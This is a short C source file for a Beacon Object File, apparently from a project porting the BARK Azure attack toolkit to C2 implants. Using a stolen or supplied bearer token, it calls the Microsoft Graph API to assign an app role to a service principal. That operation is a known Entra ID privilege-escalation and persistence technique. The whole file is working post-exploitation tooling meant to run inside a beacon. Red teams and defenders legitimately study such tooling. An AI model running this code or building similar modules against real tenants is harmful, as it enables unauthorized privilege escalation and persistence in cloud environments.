/*
 * new_entra_app_role_assignment.c — BARK BOF
 * New-EntraAppRoleAssignment — Assign an app role to a service principal
 *
 * Args : token, principalId, resourceId, appRoleId
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char   pathBuf[512], bodyBuf[512];
    LPWSTR widePath = NULL;
    char  *token = NULL, *principalId = NULL, *resourceId = NULL, *appRoleId = NULL;

    BeaconDataParse(&parser, args, alen);
    token       = BeaconDataExtract(&parser, NULL);
    principalId = BeaconDataExtract(&parser, NULL);
    resourceId  = BeaconDataExtract(&parser, NULL);
    appRoleId   = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_new_entra_app_role_assignment "
            "<token> <principalId> <resourceId> <appRoleId>\n");
        return;
    }
    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"principalId\":\"%s\",\"resourceId\":\"%s\",\"appRoleId\":\"%s\"}",
        principalId, resourceId, appRoleId);
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "/v1.0/servicePrincipals/%s/appRoleAssignments", principalId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] New-EntraAppRoleAssignment\n");
    BarkPost(L"graph.microsoft.com", widePath, L"POST", bodyBuf, token, "application/json");
    HFree(widePath);
}
